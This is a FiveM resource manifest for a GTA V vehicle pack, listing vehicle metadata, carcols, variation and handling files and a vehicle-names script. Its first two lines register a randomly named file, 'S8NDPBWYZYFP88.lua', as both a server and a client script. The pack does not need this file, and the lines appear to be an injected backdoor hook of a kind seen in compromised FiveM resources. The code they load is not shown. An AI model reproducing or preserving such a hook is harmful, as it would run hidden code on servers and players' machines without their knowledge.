server_script "S8NDPBWYZYFP88.lua"
client_script "S8NDPBWYZYFP88.lua"
fx_version 'adamant'
game 'gta5'

files {
	'data/*.meta',
	'data/**/*.meta',
}

data_file 'VEHICLE_METADATA_FILE' 'data/vehicles.meta'

data_file 'VEHICLE_METADATA_FILE' 'data/*_vehicles.meta'
data_file 'CARCOLS_FILE' 'data/*_carcols.meta'
data_file 'VEHICLE_VARIATION_FILE' 'data/*_carvariations.meta'

data_file 'HANDLING_FILE' 'data/**/*_handling.meta'

client_scripts {
	'vehicle-names.lua',
}